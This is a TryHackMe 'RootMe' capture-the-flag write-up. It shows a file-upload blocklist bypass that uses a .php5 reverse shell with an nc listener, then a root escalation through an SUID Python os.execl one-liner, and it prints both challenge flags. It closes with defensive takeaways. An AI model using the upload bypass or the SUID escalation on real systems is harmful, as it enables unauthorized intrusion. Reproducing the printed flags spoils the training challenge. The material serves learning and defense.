# [RootMe](https://tryhackme.com/room/rrootme)

| Field      | Details                          |
|------------|----------------------------------|
| Room       | [RootMe](https://tryhackme.com/room/rrootme) |
| Platform   | TryHackMe                        |
| Difficulty | Easy                              |
| Category   | Web Exploitation, Linux PrivEsc  |
| Tags       | File Upload Bypass, Reverse Shell, SUID Abuse |

---

## Overview

The room asks a simple question. Can you root me. The answer involves a file upload form that trusts extensions more than it should and a Python binary that was left with the SUID bit set like a spare key under the doormat.

From a blue team perspective this room is a compact lesson in two of the most common findings in real world web app assessments: insufficient upload validation and forgotten SUID binaries. Neither requires exotic tooling. Both show up constantly in actual pentest reports, which is exactly why this "beginner" room earns a permanent place in any fundamentals refresher.

---

## Enumeration

### Port Scan

```bash
nmap -sC -sV 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)

Two open ports. SSH is not going anywhere without credentials, so port 80 gets the first look.
Attack surface
┌──────────────────────────────────────┐
│  Internet                            │
│         ┌──────────┐                 │
│         │  Port 80 │◄── Start here   │
│         │  Apache  │                 │
│         └──────────┘                 │
│         ┌──────────┐                 │
│         │  Port 22 │◄── No creds yet │
│         │  SSH     │                 │
│         └──────────┘                 │
└──────────────────────────────────────┘

### Web Reconnaissance

`http://<TARGET_IP>/` serves a small "HackIT" themed site. Nothing useful sits in the page source, so it is time to go looking for what is not linked anywhere.

### Directory Fuzzing

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 30
```
/css      (Status: 301)
/js       (Status: 301)
/panel    (Status: 301)
/uploads  (Status: 301)

`/css` and `/js` are exactly as exciting as they sound. `/panel` and `/uploads` are the two directories that actually matter.
Directory map
┌─────────────────────────────────────────┐
│  /                                       │
│  ├── /css        static assets           │
│  ├── /js         static assets           │
│  ├── /panel      ◄── file upload form    │
│  └── /uploads    ◄── uploaded files land │
│                       here, executable   │
└─────────────────────────────────────────┘

`/panel` hosts a file upload form. `/uploads` is where anything submitted through that form ends up being served back, which is the whole vulnerability in one sentence.

---

## Initial Access

### Probing the Upload Filter

A plain `.txt` file uploads without complaint, confirming the form works and the files land under `/uploads/`. A `.php` file gets rejected, so the application is filtering on extension rather than content, which is a distinction that matters a great deal.
Upload filter logic (assumed)
┌───────────────────────────────────┐
│  if extension == ".php" → reject  │
│  else                   → accept  │
└───────────────────────────────────┘

Blocking a single extension while trusting every variant of it is the classic mistake. PHP will happily execute `.php3`, `.php4`, `.php5`, and `.phtml` on a default Apache config with `mod_php`, and none of those strings match the blocklist entry for `.php`.

### Bypassing the Filter

A minimal PHP reverse shell renamed to `.php5` sails through the filter untouched:

```bash
cp php-reverse-shell.php rootme.php5
```

Upload it through `/panel`, then set up a listener:

```bash
nc -lvnp 4444
```

Trigger the shell by requesting it directly:
http://<TARGET_IP>/uploads/rootme.php5

The listener catches a connection as `www-data`.
Upload bypass chain
┌──────────────────────────────────────────────┐
│  rootme.php  ──►  blocked by extension filter │
│  rootme.php5 ──►  filter has no rule for it   │
│             ──►  Apache executes it anyway    │
│             ──►  reverse shell to attacker     │
└──────────────────────────────────────────────┘

### Capturing user.txt

```bash
whoami
# www-data

find / -name user.txt 2>/dev/null
# /var/www/user.txt

cat /var/www/user.txt
```

> **user.txt:** `THM{y0u_g0t_a_sh3ll}`

---

## Privilege Escalation

### Hunting for SUID Binaries

```bash
find / -user root -perm -4000 -type f 2>/dev/null
```

Buried in the usual list of `passwd`, `sudo`, `su`, and `mount` sits an entry that has no business being there:
/usr/bin/python

A general purpose scripting language interpreter with the SUID bit set is not a standard Ubuntu default. Someone put it there, almost certainly to make a task in this room possible, but the underlying mistake is entirely real: any SUID binary capable of spawning a shell, reading files, or executing arbitrary code is a direct path to root.

### Confirming via GTFOBins

A quick check against GTFOBins confirms Python is a listed SUID escalation vector. The exploitation is one line:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag on `sh` preserves the effective UID inherited from the SUID binary instead of dropping it, which is the detail that actually delivers root.
SUID escalation chain
┌────────────────────────────────────────────────┐
│  find -perm -4000 ──► /usr/bin/python (SUID)    │
│  GTFOBins lookup   ──► os.execl escalation entry│
│  python -c os.execl ──► sh -p                   │
│                    ──► euid=0(root)             │
└────────────────────────────────────────────────┘

### Capturing root.txt

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root)

cd /root
cat root.txt
```

> **root.txt:** `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Attack Path Summary
[Recon]
│
└─ gobuster ──► /panel (upload form) + /uploads (serves files)
│
[Initial Access]
│
├─ .php  ──► blocked by extension filter
└─ .php5 ──► filter blind spot, Apache executes it
│
[Foothold]
│
└─ reverse shell as www-data ──► find user.txt in /var/www
│
[Privilege Escalation]
│
└─ find -perm -4000 ──► /usr/bin/python (SUID)
──► GTFOBins os.execl bypass
──► sh -p ──► root ──► /root/root.txt

---

## Flags

| # | Question                                  | Answer                          |
|---|--------------------------------------------|----------------------------------|
| 1 | user.txt                                   | `THM{y0u_g0t_a_sh3ll}`           |
| 2 | root.txt                                   | `THM{pr1v1l3g3_3sc4l4t10n}`      |

---

## Blue Team Takeaways

**Extension Based Upload Filtering**
Blocking `.php` while allowing `.php5`, `.phtml`, `.pht`, and every other Apache recognized PHP handler extension is a blocklist problem, not a validation problem. The fix is an allowlist of permitted extensions combined with content type verification and, ideally, serving uploaded files from a directory with execution disabled entirely (`php_admin_flag engine off` or an equivalent Nginx location block). File upload functionality should never coexist with an executable uploads directory.

**SUID Binaries on Interpreters**
A SUID bit on any general purpose interpreter (Python, Perl, even `find` and `awk` in the right context) is functionally equivalent to a root shell for whoever can execute it. Regular SUID audits with `find / -perm -4000` should be part of routine Linux hardening, and any binary that does not have a clear, documented reason for the bit should have it removed. GTFOBins exists precisely because these misconfigurations are common enough to catalog.

**Detection Opportunities**
Web server logs showing an upload followed immediately by a GET request to the same uploaded path are a strong signal worth alerting on. Endpoint monitoring for `python`, `perl`, or similar interpreters spawning a shell with an inherited elevated EUID is another high value detection that catches this exact technique regardless of which binary gets abused.

---

*Rooted. No survivors, except the flag files.*
